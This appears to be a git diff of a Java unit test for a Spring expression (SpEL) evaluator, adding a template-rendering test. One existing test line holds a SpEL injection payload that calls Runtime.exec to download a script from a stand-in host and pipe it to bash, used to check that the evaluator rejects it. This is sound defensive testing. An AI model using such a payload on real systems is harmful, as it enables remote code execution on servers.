@@ -5,6 +5,8 @@ import com.wind.common.exception.BaseException;
 import org.junit.jupiter.api.Assertions;
 import org.junit.jupiter.api.Test;
 import org.springframework.expression.EvaluationContext;
+import org.springframework.expression.ParserContext;
+import org.springframework.expression.common.TemplateParserContext;
 import org.springframework.expression.spel.support.StandardEvaluationContext;
 
 import java.util.HashMap;
@@ -55,6 +57,21 @@ class SpringExpressionEvaluatorTests {
         // 恶意用户可能通过输入这样的 SpEL 表达式来执行任意命令：
         String expression = "T(java.lang.Runtime).getRuntime().exec('curl http://examle.com/1.sh | bash')";
         BaseException exception = Assertions.assertThrows(BaseException.class, () -> SpringExpressionEvaluator.DEFAULT.eval(expression));
-        Assertions.assertEquals("不允许调用 class name = java.lang.Runtime 的方法",exception.getMessage());
+        Assertions.assertEquals("不允许调用 class name = java.lang.Runtime 的方法", exception.getMessage());
+    }
+
+    @Test
+    void testRenderTemplateText() throws Exception {
+        SpringExpressionEvaluator evaluator=new SpringExpressionEvaluator(new TemplateParserContext());
+        String expression = "spring.datasource.password=#{render('a')}example=${a}";
+        StandardEvaluationContext context = new StandardEvaluationContext(new ExampleObject());
+        Assertions.assertEquals("spring.datasource.password=render_funcs_aexample=${a}", evaluator.eval(expression, context));
+    }
+
+    public static class ExampleObject {
+
+        public String render(String text) {
+            return "render_funcs_" + text;
+        }
     }
 }
